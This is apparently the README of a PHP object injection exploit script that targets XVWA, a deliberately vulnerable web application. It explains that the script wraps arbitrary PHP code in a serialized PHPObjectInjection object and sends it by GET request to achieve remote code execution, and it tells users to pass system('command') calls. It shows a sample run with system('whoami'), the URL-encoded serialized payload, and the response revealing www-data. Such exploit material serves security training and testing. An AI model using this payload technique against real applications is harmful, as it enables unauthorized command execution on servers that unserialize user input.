# php_object_injection

This script is designed to exploit a flawed logic in the PHP `deserialize()` function. The application takes user input and echoes it back on the front-end without sanitization via the `home.php` from [XVWA](https://github.com/s4n7h0/xvwa/blob/master/vulnerabilities/php_object_injection/home.php). The script takes a PHP function as its first argument, serializes it with the `PHPObjectInjection` class, and sends a `GET` request to the victim's page to achieve Remote Code Execution. 

The script prints out the url-encoded payload that's sent to the victim's site before showing the response from the victim.

You need to add `;` at the end of your PHP code to avoid having an error in PHP `eval()` function. To execute commands you can pass `system('your_command');` to the script.

## Example of execution returning `www-data` as running user of web app:

```bash
$ php script.php "system('whoami');"

Serialized Payload: O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A17%3A%22system%28%27whoami%27%29%3B%22%3B%7D
## ...html code...
<div class="well">
    <p>
        <form method="get" action="">
            <div class="form-group">
                <div class="text-left">
                    <label></label>
                <div class="form-group" align="left"> 
                    <a class="btn btn-primary" href='?r=a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}' type="submit">CLICK HERE</a>
                </div>
                    www-data
     </div>
 </div>
## ...html code...
```
